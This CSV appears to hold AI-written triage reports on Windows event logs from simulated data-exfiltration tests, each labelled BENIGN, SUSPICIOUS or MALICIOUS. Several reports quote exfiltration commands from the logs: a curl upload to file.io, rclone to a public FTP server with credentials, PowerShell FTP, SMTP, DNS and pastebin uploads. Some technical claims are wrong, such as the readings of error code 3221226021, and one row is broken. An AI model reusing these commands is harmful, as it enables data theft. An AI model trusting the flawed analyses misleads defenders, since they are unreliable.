Directory Name,AI Response
DNSExfiltration (doh),"After analyzing the provided Windows event logs, the following findings and assessments are noted:

### Analysis:

1. **PowerShell Execution with Suspicious Script**:
   - Multiple Sysmon and PowerShell logs indicate the execution of `powershell.exe` with a suspicious command-line parameter. The execution is importing a script from a temporary directory: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1""` and invoking `Invoke-scripttrator` with external parameters.
   - The use of temporary directories combined with PowerShell and downloading or executing scripts can be an indicator of malicious activity such as potential script-based attacks or unauthorized administrative actions.

2. **Wevtutil and Conhost Processes**:
   - There are frequent executions of `wevtutil.exe` and `conhost.exe`. While these may be legitimate utility usages, the rapid sequence with the same `admin_test` user raises questions about the intent and necessity of these processes.

3. **Windows Sysmon Logs**:
   - Multiple sysmon event logs document process creation events, but the concentration of `powershell.exe` executions and the specificity of the scripts being run lends credence to potential unauthorized activities.
   
4. **Process Integrity**:
   - The processes run under the `admin_test` user have a high-integrity level, which shows they were executed under administrative privileges.

5. **No High-Security Flags**:
   - The included logs do not indicate active antivirus alerts or high-severity security breaches detected by Windows Defender, as evidenced in the application logs stating ""SECURITY_PRODUCT_STATE_ON"".

### Conclusion:

The logs highlight a repeated execution of PowerShell scripts from a suspicious temporary path with parameters that could potentially relate to unauthorized actions or data exfiltration attempts.

### Recommendation:

- **Further Investigation**: The activity is classified as SUSPICIOUS. Further investigation is needed:
  - Perform a threat hunt related to the script being executed (`script.ps1`) to gather any additional context about its purpose and origin.
  - Check for any network connections or data exfiltration attempts associated with other logs or security monitoring tools.
  - Validate whether the account `admin_test` was authorized for these activities or if there's potential for account compromise.

### Resolution: SUSPICIOUS

The evidence of PowerShell scripts invoking potentially suspicious commands warrants additional scrutiny, possibly involving checking any remaining logs or deploying other intelligence measures to clarify the intentions or potential impact of these actions."
Exfiltration Over Alternative Protocol - HTTP,"Upon analyzing the provided logs, here are the key observations and assessments:

### Application Log
- The application log principally contains entries related to the Software Protection Platform Service. The specific log entry doesn't exhibit indications of malicious activity.

### Security Log
- **Event ID 4616** shows changes in system time. While time changes can be suspect, particularly if done by an unauthorized user, these changes appear to be made by the `LOCAL SERVICE` account via `svchost.exe`. Unless connected with malicious activity, service-induced time change events can be routine.
  
- **Event ID 4634** is associated with logoff events, where the `admin_test` account logs off with `LogonType=3`, indicating a network logoff. This is typical of remote access but aligns with other logon patterns, so this event alone does not raise acute suspicion.

- **Event ID 4672** indicates special privileges were assigned to the `admin_test` user. The extended rights (like `SeDebugPrivilege` and `SeImpersonatePrivilege`) are typically associated with administrative tasks. However, combined with remote logons, this could be concerning, suggesting further review of `admin_test` activities.

- **Event ID 4624** outlines successful logons by `admin_test` through NTLM from a remote workstation named `DESKTOP-3HL5B2P`. While the logon method is not unusual itself, aligning with preceding events, the pattern of remote access with high privileges should be further investigated to rule out unauthorized access.

### Windows PowerShell Log
- **PowerShell Event ID 600** shows an invocation of PowerShell with the command `Invoke-WebRequest` to localhost, apparently fetching content from Notepad executable. This could indicate an attempt at data exfiltration or a deliberate test. Use of PowerShell for such functions demands concern given its frequent misuse in post-exploitation scenarios.

### Sysmon Log
- **Process IDs and Evolution (Sysmon Event ID 1 and 5)**:
  - Monitoring executions of standard system utilities (`whoami`, `hostname`, `wevtutil`) under user `admin_test` signifies scripting or automated task sequences.
  - The modified files with conhost.exe serve as console windows host, reinforcing the command-line or script-based execution nature.

- **Edge and Update Entries**: Several processes related to `Microsoft EdgeUpdate` and `TrustedInstaller.exe`. These operations seem related to system updates and are typical for a Windows environment, suggesting no inherent malicious activity.

### System Log
- Contains entries primarily indicating timezone and system time adjustments, paralleling the entries from security logs again initiated by `svchost.exe`. These corrections, while possibly concerning, are not overtly malicious without additional, supporting concerns.

### Summary and Resolution
The logs primarily reveal:
- Elevated privileges and repeated remote logons executed by `admin_test` are somewhat typical for administrative tasks. However, the combination with PowerShell activity suggests the potential for misuse.
- PowerShell invocation includes actions that are anomalous and potentially exfiltration-related.

Given these observations, a resolution of **SUSPICIOUS** is appropriate, warranting additional evaluation of remote access patterns and PowerShell usage specifics by the `admin_test` account. It's recommended to:
- Confirm the legitimacy of `admin_test` activities within these durations.
- If this user activity is indeed unauthorized or unexplained, conduct a thorough forensic analysis and increase monitoring.
- Ensure policies for remote logons and PowerShell usage are reviewed and potentially revised.

Further investigation should strive to confirm or dispel the possibility of a hidden compromise within this set of events."
Exfiltration Over Alternative Protocol - ICMP,"Based on the provided log entries, the following analysis identifies any suspicious actions and determines whether these logs indicate benign, suspicious, or malicious activities:

1. **Time Change Events in System Logs**:
   - There are multiple instances of time changes in the system logs (EventID 24 and 1). This could be benign, such as due to server synchronization or updates, but frequent or unauthorized time changes could be indicative of an attempt to manipulate logs or evade detection.
   
2. **Execution of Utilities**:
   - The execution of command utilities such as `hostname.exe`, `whoami.exe`, and `conhost.exe` in the Sysmon logs appears standard for a user (SERVER002\\admin_test) executing these commands, likely for checking system status or configuration.
   - However, frequent execution of these utilities, especially if unexpected, may warrant further investigation as they are often used in malicious operations to gather information.

3. **PowerShell Activity**:
   - A PowerShell script is executed, indicated by logs from Windows PowerShell logs. The command involves using the `ping` command in a potentially obfuscated way using a PowerShell script to read bytes from `notepad.exe` and sending them to `127.0.0.1`. This activity is unusual as sending file content via ping is a known data exfiltration technique.
   - The command should be thoroughly investigated. The user executing this script (`SERVER002\\admin_test`) along with the origin of the script should be reviewed to ensure it is legitimate.

4. **Edge Update Events**:
   - The logs also show normal software updating activities such as Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`), which is typically automated and expected on Windows systems.

5. **Log Entries Analysis**:
   - Overall, while most activities (such as time changes, svchost.exe, wevtutil.exe) could be routine or administrative, the specific PowerShell command execution is an outlier and suggests potential misuse of privileges.

**Assessment:**
- **SUSPICIOUS**: The presence of the PowerShell script interacting with system utilities in a manner often used for data exfiltration marks this log as suspicious. This particular action demands further investigation to confirm the user's intent and to understand the context (e.g., task scheduling, script usage, user behavior).

**Guidance for Proceeding**:
- Conduct an in-depth investigation into the PowerShell script execution, focusing on identifying the creator and original intent of the script.
- Review user activities and permissions for SERVER002\\admin_test to determine if there are any unauthorized activities or privilege escalations.
- Monitor similar activities across other systems to ensure this behavior is not part of a larger compromise.
- Implement stricter auditing and alerts for anomalous PowerShell and time change activities.

The activities recorded in the logs are predominantly benign with the exception of the PowerShell command, which necessitates further scrutiny before ruling out any compromise."
C2 Data Exfiltration,"After reviewing the provided Windows event logs, I've identified the following key points that may indicate potential suspicious or anomalous activity:

### Analysis Summary

1. **Windows PowerShell Logs:**
   - The logs highlight the execution of a PowerShell script that checks for the existence of a file, creates it with specific content if absent, and then uses `Invoke-WebRequest` to post the file contents to an external URL (example.com). This behavior is suggestive of data exfiltration, a common technique used in malicious activities. The use of PowerShell for such operations needs further scrutiny as it could be indicative of malicious intent, particularly when interfacing with external sites.

2. **Security Logs:**
   - The `admin_test` user performs actions with elevated privileges. The presence of `SeDebugPrivilege`, among other powerful privileges, is concerning, as this particular privilege could be used for operating at high levels within the system. It’s crucial to confirm that this is consistent with typical administrative activities and not unauthorized privilege escalation.

3. **System Time Modification:**
   - There are entries indicating a system time change by `svchost.exe`. While time adjustments can be normal, unexpected and unexplained changes may point towards attempts to manipulate system records or evade time-based detection systems.

4. **Sysmon Logs:**
   - Frequent execution of system utilities like `wevtutil.exe` and `conhost.exe` by the `admin_test` user, along with tasks running at elevated privileges, should be reviewed to ensure they align with expected administrative tasks and are not attempts at system manipulation or persistence mechanisms.
   - The execution of `whoami.exe` and querying commands like `hostname` in short order, though benign on the surface, could be checking system attributes post-compromise. Together with PowerShell activity, this could indicate an attacker mapping out the environment or confirming system access.

### Assessment

Based on the assessment, there are strong indicators of potentially **SUSPICIOUS** activity due to:
- The use of PowerShell for file manipulation and data transfer to an external URL.
- Privileged operations by the `admin_test` account that must be validated against normal usage patterns.
- System time changes that should be checked to ensure they are part of legitimate maintenance or administrative tasks.

### Recommended Actions

1. **Immediate Review:**
   - Confirm whether the PowerShell script and external data transfer were authorized or part of scheduled administrative tasks.
   - Validate all privileged activities associated with `admin_test` to ensure they align with company policies and usual admin activities.
   - Investigate the system time changes to validate they were not maliciously altered.

2. **Further Investigation:**
   - Conduct a comprehensive review of network logs to identify if any unusual data transfer occurred or if communications with suspicious external addresses were made around the time of the PowerShell activity.
   - Review past behavior for the `admin_test` account for anomalies or potential credential misuse.

3. **Safety Measures:**
   - Strengthen monitoring and alert thresholds for administrative PowerShell use and tools that interact with critical system components.
   - Ensure regular updates to privilege review processes to detect unexpected changes.

Concluding, the activities contained within these logs merit classification as **SUSPICIOUS** and should be investigated further to rule out or confirm malicious intent."
Exfiltrate data HTTPS using curl windows,"Upon analyzing the event logs provided, here are the findings and assessments regarding potential indicators of malicious activity:

### Suspicious Activity Observed:
1. **Command Execution and Potential Data Exfiltration:**
    - The use of `cmd.exe` to execute a command involving `curl.exe` stands out: 
      - `""cmd.exe"" /c C:\Windows\System32\Curl.exe -k -F ""file=@C:\Users\ADMIN_~1\AppData\Local\Temp\file/data.002/src/artifact"" https://file.io/`
    - This command attempts to upload a file to a public file-sharing service (`https://file.io/`), which can indicate potential data exfiltration, a known pattern in malicious activities.

2. **Process Chain Monitoring:**
    - Processes such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `curl.exe` were executed under the same user `SERVER002\admin_test`. While not inherently malicious, the specific combination and the goal of running `curl.exe` warrant closer scrutiny.

3. **Elevation Context:**
    - The execution of these commands under a high integrity level (`IntegrityLevel: High`) suggests actions performed with elevated privileges, potentially increasing the risk if executed by a compromised account.

### Benign Activities:
- Several processes and activities appear associated with standard software operations or maintenance tasks:
  - Execution of `MicrosoftEdgeUpdate.exe` appears to be a scheduled update process conducted by Microsoft Edge Update Service.
  - `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` activities appear as typical operations for system service processes. 

### Conclusion:
The activity involving the execution of `curl.exe` with the command intending to upload a file to an external domain is suspicious and indicative of potential data exfiltration efforts. While this doesn't provide absolute certainty of malicious intent, it requires further investigation.

### Resolution: SUSPICIOUS

### Recommended Actions:
1. **Immediate Investigation:**
   - Verify the legitimacy of the user account `SERVER002\admin_test` and ensure the integrity of its credentials.
   - Investigate the origin and content of the file located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file/data.002/src/artifact`.

IcedID Botnet HTTP PUT,"Upon detailed examination of the provided Windows event logs, several observations stand out concerning potential suspicious or anomalous behavior:

1. **High-Privilege Logon Events:**
   - The ""admin_test"" account is consistently logging in with elevated privileges, as evidenced by Event ID 4672 entries (privileges: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.).
   - Logon type 3 indicates network logons, which are typical for accessing a system remotely.
   - The usage of NTLM authentication could suggest an older version of Windows or a less secure configuration being exploited.

2. **PowerShell Activities:**
   - Several PowerShell activities are logged. A script execution is observed attempting to execute a PowerShell command that involves creating a text file and performing a web request using `Invoke-WebRequest` (Sysmon Event ID 1).
   - The command attempts to write to a file (`C:\temp\data_scriptFile.txt`) and upload it to a URL, which could indicate data exfiltration activities.

3. **Event Log Clear Attempt:**
   - Repeated execution of `wevtutil.exe`, a utility for managing Windows event logs, could indicate an attempt to clear or tamper with event logs, which is a common technique to cover tracks.

4. **Failed Credential Access:**
   - Multiple entries under Event ID 5379 indicate failed attempts to access credentials related to a ""MicrosoftAccount:user=02txoixylodcstop"" and ""WindowsLive"", with return code 3221226021.

5. **Normal System Activity:**
   - Background processes such as Microsoft Edge updates, Windows Update client, and antimalware updates suggest regular system activities (Sysmon Event IDs related to system updates and Windows Update Client events).

### Assessment:
The presence of elevated privilege logons, usage of `wevtutil.exe`, suspicious PowerShell script execution indicating possible data exfiltration, and failed credential access attempts strongly suggest unauthorized activities or potential compromise.

### Resolution:
**MALICIOUS**

### Recommendations:
Given the nature and timing of these logged events, it is crucial to:

1. **Isolate the affected system (Server002)** from the network to prevent further potential lateral movement or data exfiltration.
2. **Conduct a thorough forensic analysis** on the system to determine the extent of the compromise and gather any additional indicators of compromise (IOCs).
3. **Review and strengthen access controls and authentication mechanisms**, especially focusing on NTLM authentication, to mitigate future unauthorized access.
4. **Monitor network traffic** for any suspicious activities linking to known C2 infrastructure or anomalies consistent with data exfiltration attempts."
Exfiltration via Encrypted FTP,"Upon analyzing the provided logs, we have the following observations:

### Security Logs:

1. **Time Change Events (Event ID 4616):**
   - There are multiple entries indicating changes in system time.
   - These might warrant further investigation, as unauthorized time changes can be indicative of attempts to disrupt security or audit logs.

2. **Credential Validation Events (Event ID 5379):**
   - Multiple failed credential validation attempts are seen with different TargetNames like MicrosoftAccount:user=02txoixylodcstop and WindowsLive tokens.
   - Return codes suggest failure (3221226021 is STATUS_ACCOUNT_LOCKED_OUT), which might be benign if the account is genuinely locked, but could also indicate brute-force attempts.

3. **Logon Events (Event ID 4624) and Special Logon (Event ID 4672):**
   - Logon type 3 (network logon) by user 'admin_test', which should be checked against normal user behavior to ensure it is authorized.
   - The presence of privilege elevation (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) granted to 'SYSTEM' and 'admin_test' indicates potential access to critical functions.

### Sysmon Logs:

1. **Process Creations:**
   - Execution of PowerShell with potentially suspicious scripts indicates possible data exfiltration or unauthorized configuration changes.
   - The PowerShell command involves setting sample data and using FTP commands (`Invoke-WebRequest` to an FTP server, e.g., ftp://example.com), which is particularly concerning and might indicate an attempt to exfiltrate data.

2. **Use of wevtutil.exe and schtasks.exe:**
   - Multiple entries for 'wevtutil.exe' and 'schtasks.exe', particularly 'schtasks.exe' might indicate task scheduling or manipulation of event logs in a suspicious manner.

### System and Application Logs:

1. **Windows Update:**
   - Logs reflect successful updates of the Windows Defender, which signifies normal security practices.

2. **No evident Errors or Warns related logs:**
   - There are no severe warnings or application errors that stand out as part of the current analysis.

### PowerShell Logs:

- **PowerShell Scripts Execution:**
  - The execution of scripts that use FTP for data transfer is found; such activities are often used for data exfiltration.
  - This usage could imply command execution potentially by unauthorized users, disguised within regular user commands via PowerShell.

### Assessment:

Given the multiple failed credential validations, use of PowerShell to execute scripts potentially aiming to send data offsite, and system time changes, this activity is suspicious and may indicate potential unauthorized activity or preparatory actions by an attacker.

### Resolution:

**SUSPICIOUS** - There are behaviors indicative of potentially malicious intentions requiring further investigation. It is strongly advised to:

- Investigate the origin and intention of the PowerShell scripts.
- Confirm if the 'admin_test' account actions align with expected behavior.
- Review any changes to system time settings and check for unauthorized changes.
- Monitor network traffic for FTP connections to external servers.

Further comprehensive behavior analysis, network monitoring, and forensic investigation should be conducted to confirm any malicious activities."
Exfiltration Over Alternative Protocol - FTP - Rclone,"Based on the analysis of the provided log entries, here is a detailed assessment of the situation:

### Suspicious or Anomalous Behavior

1. **PowerShell Activity**: The logs contain multiple entries showing the execution of PowerShell scripts that involve downloading and executing files using `rclone`:
   - PowerShell script executed with command-line arguments to locate `rclone.exe` and a script archive (`script.zip`) from the `C:\Users\Public\Downloads\` directory.
   - The script then configures an FTP server with credentials and attempts to copy files to it using `rclone`.

2. **Use of Rclone**: `Rclone` is typically a legitimate tool used for syncing files to cloud storage, but in this context, it has been used to copy files to an external FTP server. This behavior can be considered suspicious because:
   - The FTP connection uses credentials (`user: dlpuser`, `pass: rNrKYTX9g7z3RgJRmxWuGHbeu`) to connect to a public FTP server (`ftp.dlptest.com`).
   - The command-line includes options that could indicate an intentional exfiltration of data (`copy --max-age 2y`, `--ignore-existing`, `-q`, `--auto-confirm`).

3. **Repeated Execution of Host Processes**: There are several repeated executions of system processes like `conhost.exe` and `wevtutil.exe` with the same user context (SERVER002\admin_test). While these executions are not inherently malicious, the context and frequency of the operations suggest they might be part of a broader, potentially malicious activity.

### Indicators of Malicious Activity

- **PowerShell Weaponization**: PowerShell commands used to automate the process of configuring and using `rclone` for potentially unauthorized data transfers. Such use of PowerShell for downloading tools and manipulating files stealthily is a common tactic in cyber-attacks.
- **Exfiltration to Public FTP**: The use of public FTP credentials for data transmission is suspicious and raises concerns about unauthorized data exfiltration.

### Security and Application Logs

- **Security Logs**: Various logs indicate SYSTEM-level privileges and background task executions involving querying user rights (`EventID 4798`). The access and privilege levels observed (such as `SeDebugPrivilege`, `SeTcbPrivilege`) in logs could potentially lead to misuse if leveraged by an attacker.
  
- **Application Logs**: These logs primarily show that Windows Defender was active (SECURITY_PRODUCT_STATE_ON), but do not provide specific evidence of threat detection or mitigation.

### Resolution

Given the suspicious use of PowerShell to configure an FTP connection and transfer files using `rclone`, this activity cannot be conclusively deemed benign without further investigation.

**Resolution: SUSPICIOUS**

### Guidance and Actions

1. **Immediate Investigation**: Investigate the source and purpose of the `rclone.exe` tool in the environment. Determine who initiated the download and execution of this tool.

2. **File Integrity and System Audit**: Conduct file integrity checks and audit critical systems for unauthorized changes. Ensure configuration management and monitoring solutions are validated for any unexplained deviations.

3. **Network and Endpoint Monitoring**: Implement enhanced monitoring on network activities, particularly focusing on outbound connections to public FTP servers. Use endpoint detection to track any further abnormal PowerShell executions or similar activities.

4. **Review User Access**: Check and confirm that the accounts involved in these activities have not been compromised or misused.

5. **Security Controls and Policies**: Ensure security controls like firewalls and intrusion detection/prevention systems have up-to-date rulesets to detect and alert similar patterns in real-time.

It is strongly recommended to conduct a thorough incident response investigation to corroborate these findings and ensure no malfeasance is occurring within the network."
Exfiltrate data with rclone to cloud Storage - Mega (Windows),"Upon reviewing the provided event logs from a Windows host machine, several key points of suspicious activity have been identified, which highlight possible indicators of malicious behavior.

### Detailed Analysis of Logs:

#### Security Log:
1. **Event ID 4624** indicates a logon success with Logon Type 5, which is used for service logons. The event shows SYSTEM as the target user, which is normally expected; however, given the context of the other logs, it could correlate with unauthorized privilege use, especially since this is a high-privilege account used for sensitive system operations.

2. **Event ID 4672** shows the assignment of multiple sensitive privileges, including SeDebugPrivilege and SeTcbPrivilege, indicating a process that may have been able to operate with powerful system-level capabilities. This event typically suggests potential for privilege escalation or be indicative of preparatory steps by a malicious actor gaining a foothold.

#### Windows PowerShell Log:
- A script was executed which created directories and configuration files within the `%appdata%` directory for `rclone`, followed by running `rclone` commands to configure and copy data. The script attempted to load the `mega` configuration, indicating potential data exfiltration attempts to an external cloud service.

- The command includes a user (`filetesting@outlook.com`) and a password which suggests unauthorized configuration or usage, commonly seen with malicious data transfers.

#### Sysmon Log:
1. The `powershell.exe` execution aligns with the suspicious PowerShell log entries that orchestrated `rclone` use. This indicates a network-aware tool in use possibly for data exfiltration.

2. Multiple binary images starting such as `wevtutil.exe`, `conhost.exe` etc., seem consistent, nevertheless, the presence of repeated and rapid executions along with PowerShell command lines aligns with an attempt to potentially obfuscate or exploit these binaries in conjunction with PowerShell scripts.

3. Entries showing `rclone.exe` being actively run, paired with these PowerShell activities, reiterate potential unauthorized transfer activities, capitalizing on the system's admin account.

4. System stability activities such as running `Microsoft Edge Installer` updates, seen as legitimate operations but do not distract from the coinciding shadow operations (rclone managed by PowerShell).

### Assessment:

- **Indicators of Compromise**: Use of `rclone` configuration and command-line operations suggests a likely unauthorized transfer of data to a remote storage, possibly indicating data exfiltration.
- **Suspicious Privileges and Logons**: High levels of access being configured and used (system accounts) at times which correlate with the potential remote tool deployments.
- **PowerShell Operations**: Enabling scripts with network transfer capabilities under adversarial usage contexts.

### Guidance:
Given the identified activities seem tailored for data exfiltration using `rclone`, it is critical to:
- Immediately inspect the files at the source paths and in the `AppData` locations regarding `rclone` configuration.
- Verify user account activities, credentials, and authorizations, focusing on anomalies like account misuse.
- Perform network monitoring post-incident, looking for any suspicious outbound connections or data flow to identify additional indicators of compromise or persistence mechanisms.
- Consider engaging incident response to ascertain the scope and origin of these activities and mitigate further unauthorized data exposure.

### Final Resolution:
- **MALICIOUS**: The logs strongly suggest misuse of system capabilities for unauthorized data exfiltration using toolsets that execute under trusted process shells like PowerShell and leverage rclone for network operations, indicating a probable breach."
Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),"Upon analyzing the provided Windows event logs, there are several points to consider in determining whether malicious activities are present:

1. **PowerShell Activity**: A PowerShell script with a command to invoke a web request to Pastebin using `Invoke-RestMethod` was detected. The script seems to be posting data labeled as ""secrets, api keys, passwords..."" to an external URL, specifically ""https://pastebin.com/api/api_post.php"". This type of activity can be consistent with data exfiltration attempts, where sensitive information is sent to an external server.

2. **Privilege Escalation**: The security events include an event indicating that the user ""admin_test"" on ""SERVER002"" has been granted a list of high-privilege rights such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others (EventID 4672). These privileges can allow a user to perform actions at an elevated system level, potentially indicative of illicit privilege escalation.

3. **Time Change Events**: Several kernel events (EventID 1) show changes to the system time. This can sometimes be associated with attempts to obscure evidence of malicious activity by altering timestamps. These events should be scrutinized, especially if they coincide with suspicious activities.

4. **EdgeUpdate Activity**: There are numerous entries related to ""Microsoft Edge Update"", which in itself is not suspicious, but the high frequency and complexity of command lines merit further scrutiny for potential abuse. However, without specific anomalous indicators, these entries alone are not decisive for malicious activity.

In conclusion, the combination of dubious PowerShell activity potentially involving data exfiltration, the assignment of high-level privileges to a user during this period, and the potential manipulation of system time strongly suggests that there may be malicious activity present in these logs. 

**Resolution**: MALICIOUS

**Guidance**:
- Immediately investigate the intent and origin of the PowerShell command. Determine if it was executed in error or with malicious intent, and if any data was successfully exfiltrated.
- Review and potentially revoke elevated privileges accorded to ""admin_test"" if they are deemed unnecessary or were assigned inappropriately.
- Conduct a detailed assessment of the system for any other signs of compromise and ensure the time manipulation does not obscure any additional malicious activities.
- Consider isolating the affected host and performing a comprehensive forensic analysis to mitigate risk and understand the scope of the breach."
Exfiltration Over Alternative Protocol - SMTP,"Upon careful review of the provided Windows event logs, several points of interest were noted that may indicate suspicious activity, particularly the use of PowerShell for potentially nefarious purposes:

1. **PowerShell Execution:**
   - The PowerShell command observed in the logs includes the `Send-MailMessage` cmdlet to send an email with an attachment, specifically the `notepad.exe` file from `C:\Windows\System32`.
   - Command: 
     ```powershell
     ""powershell.exe"" & {Send-MailMessage -From test@corp.com -To test@corp.com -Subject \""data.003 file Test\"" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1}
     ```
   - This activity is concerning as sending system executables via email is atypical and possibly malicious. The choice of a local SMTP server (`127.0.0.1`) could suggest an attempt to exfiltrate data or prepare data for a malicious act without detection from external monitoring systems.
   
2. **Series of `wevtutil.exe` Executions:**
   - Multiple `wevtutil.exe` processes are executed in quick succession, which could be indicative of an attempt to manipulate event logs. This is often done to cover up tracks following a malicious operation.
   - While `wevtutil.exe` is a legitimate Windows utility, its use can be suspicious if it deviates from normal patterns in a system's operation.

3. **Process Execution Patterns:**
   - The use of `whoami.exe` and `hostname.exe` in this context, while they are legitimate system tools, may be part of information gathering steps by an unauthorized user scripted operation.

After considering the context and nature of the activities observed in the logs, especially focusing on the potentially malicious use of PowerShell and event log management tools, I would classify this situation as:

- **Resolution: SUSPICIOUS**

### Recommendations for Further Investigation:
- **Review Email Server Logs:** Check the mail server logs for any emails sent from `test@corp.com` to determine if emails with attachments were actually sent and if there are any discrepancies.
- **Analyze PowerShell Scripts and Commands:** Investigate any scripts or automation tasks that may execute PowerShell scripts in this manner, focusing on purpose and necessity.
- **Verify Legitimate Use of `wevtutil.exe`:** Determine if recent configurations or tasks might explain the burst of activity related to event logs. It might require interviewing system administrators or reviewing change management records.
- **Behavioral Monitoring:** Implement increased logging and monitoring of PowerShell activities using tools like PowerShell logging and AMSI (Antimalware Scan Interface) to detect and alert on suspicious usage patterns.

Overall, given the potential implications, the observed activities warrant closer examination and monitoring to rule out potential compromise or unintended data exposure activities."
Text Based Data Exfiltration using DNS subdomains,"Upon reviewing the given event logs, I identified a potential indicator of malicious activity. Let's go through my findings:

### Key Observations:

1. **PowerShell Execution:**
   - There is a notable PowerShell script execution captured in the logs. The command line for the PowerShell execution (`powershell.exe &amp; {$dnsServer = \""dns.example.com\""...}`) indicates data exfiltration via DNS queries.
   - The script appears to encode data (`SecretDataToscripttrate`) into base64, split it into chunks, append each chunk as part of a DNS query, and then perform DNS queries.
   - This behavior is consistent with data exfiltration techniques where data is encoded, broken into manageable parts, and sent via DNS requests, which is a common stealthy data exfiltration method.

2. **Process Execution Patterns:**
   - There are several instances of common Windows processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` being executed. The aforementioned processes can be used legitimately, but they are also leveraged in malicious activities, especially if executed consecutively or with unusual command line arguments—which isn't quite evident here.
   - Normal Windows Server operations might include these processes, especially with admin credentials (in this case, `SERVER002\\admin_test`). Their repetitive appearance with no unusual command arguments suggests normal usage.

3. **System and Security Logs:**
   - Time service adjustments are logged, which can sometimes indicate attempts to manipulate evidence of unauthorized activities. However, the logs do not indicate anything overtly malicious related to this.
   - No obvious privilege escalations were noticed. Related IDs and processes running under `SERVER002\\admin_test` and system accounts appear normal from the surface, but the correlation should be checked with active directory logs for any unusual accesses outside normal working hours or failed logins.

4. **Application Update Activities:**
   - Logs related to Microsoft Edge updates through `EdgeUpdate.exe` and `setup.exe` are typical during software updates and do not raise alarms.

### Assessment:

- **PowerShell Activity:** The PowerShell script execution is the most suspicious element as it involves potential data exfiltration through DNS queries. This needs urgent investigation to confirm whether it was legitimate activity by an admin or malicious activity.

- **Resolution:** SUSPICIOUS. Although most of the activity can be explained as normal system or administrative tasks, the PowerShell script's behavior is unusual and indicative of potential data exfiltration. This requires further investigation, especially analyzing network traffic related to `dns.example.com` and any associated activity within this timeframe.

### Recommendations:

1. **Network Analysis:** Check DNS logs and network traffic for communication with `dns.example.com`, and investigate what data might have been exfiltrated.
  
2. **User Activity Monitoring:** Review logs and authenticate with active directory records for the `SERVER002\\admin_test` account to understand the context of the PowerShell execution, ensuring it aligns with legitimate administrative tasks.

3. **Threat Hunting:** Implement more robust monitoring for similar PowerShell activities and DNS anomalies in the future.

4. **Immediate Actions:** Block or isolate the server if further evidence of malicious activity is found, and liaison with incident response to assess the wider impact and containment strategy."
MAZE FTP Upload,"### Analysis

Upon reviewing the provided event logs from different categories (Application, Sysmon, System, Windows PowerShell, and Security), I have made the following observations:

#### Indicators of Malicious Activity:

1. **Sysmon and PowerShell Logs:**
   - There are multiple sysmon events indicating the execution of `powershell.exe` with a specific and suspicious command-line invocation:
     ```plaintext
     ""powershell.exe"" & {$Dir_to_copy = ""$env:windir\temp\"", $ftp = ""ftp://127.0.0.1/"", $web_client = New-Object System.Net.WebClient, $web_client.Credentials = New-Object System.Net.NetworkCredential('', ''), if (test-connection -count 1 -computername ""127.0.0.1"" -quiet) { foreach($file in (dir $Dir_to_copy ""*.7z"")) { echo ""Uploading $file..."", $uri = New-Object System.Uri($ftp+$file.name), $web_client.UploadFile($uri, $file.FullName)}} else {echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}}
     ```
   - This PowerShell script is attempting to upload `.7z` files from the Windows temp directory to an FTP server at `127.0.0.1`. This behavior is typically indicative of data exfiltration, a common tactic among attackers. The use of `127.0.0.1` could imply testing or staging activities.

2. **Chronological and Execution Context:**
   - The PowerShell execution is under the `SERVER002\admin_test` account with a high integrity level, which implies it is operating with elevated privileges possibly to perform unauthorized data movement.
   - This kind of script execution, especially if it's not part of any known maintenance or backup procedure, raises a red flag.

3. **Potential Time Manipulation:**
   - The Security and System logs show a time change event, where the system time was set back from `2024-10-22 15:50:20` to `2024-10-22 15:49:53`. While time adjustments can occur for legitimate reasons (e.g., synchronization with an NTP server), it is suspicious because altering system time can interfere with logging mechanisms and help cover tracks.

#### Assessment

The combination of PowerShell scripting activity that attempts data exfiltration and potential time manipulation strongly suggests malicious intent. The specific use of PowerShell commands to perform FTP uploads is highly abnormal and corresponds with typical attack techniques for staging and exfiltrating data.

#### Guidance

1. **Immediate Actions:**
   - Isolate `Server002` from the network to prevent potential ongoing exfiltration.
   - Conduct a thorough investigation to determine if any critical data has been compromised.
   - Review account activity for `SERVER002\admin_test` for any signs of unauthorized access or privilege escalation.

2. **Further Investigation:**
   - Identify and review any known processes or tasks scheduled around the occurrence time in the logs.
   - Check for any recently created or modified `.7z` files in the concerned directories.

3. **Enhanced Monitoring:**
   - Increase monitoring around PowerShell activity and FTP connections, particularly from sensitive or critical servers.
   - Implement stricter access controls and audit logs for elevated access usage.

### Resolution

**MALICIOUS** - The logs indicate clear preparation for potentially harmful activities and need immediate response and thorough investigation."
Network-Based Data Transfer in Small Chunks,"Based on the provided log entries, my assessment of the situation is as follows:

**Suspicious Behavior Noted:**

1. **PowerShell Activity:**
   - A PowerShell script is executed with command lines that are indicative of suspicious activity. The script attempts to read a file, encode it in Base64, and send it to an external URI (`http://example.com`) via HTTP POST requests.
   - This kind of activity can often indicate data exfiltration or unauthorized data transfer and is generally considered unusual unless documented or known as a legitimate operation.

2. **Sysmon Log Entries:**
   - The Sysmon logs indicate multiple executions of processes (`wevtutil.exe` and `conhost.exe`) under the user `SERVER002\\admin_test`. While these processes can be legitimate, seeing multiple rapidly consecutive executions might be worth further investigation.

3. **Security Log Events:**
   - The security logs (EventID 5379) show repetitive entries with a return code `3221226021`, which implies a failure that is resulting from an invalid parameter passed or lack of credential returns. While this might not be directly indicative of malicious activity, it's unusual to see repeated failed attempts, and this warrants further investigation.

**Assessment:**
- The presence of a suspicious PowerShell script attempting to perform data exfiltration is a critical indicator of potential compromise.
- Multiple rapid process executions, especially of utilities like `wevtutil.exe`, could suggest scripted activity.
- The repetitive failed security auditing attempts could relate to failed or unauthorized access attempts.

**Resolution:**
- **Resolution: MALICIOUS**
  - The PowerShell activity suggests a strong indicator of data exfiltration or reconnaissance, which confidently points to malicious intent.
  - Immediate investigation and containment measures should be enacted.

**Guidance on Next Steps:**
1. **Immediate Actions:**
   - Isolate the compromised host from the network to prevent further potential exfiltration or lateral movement within the environment.
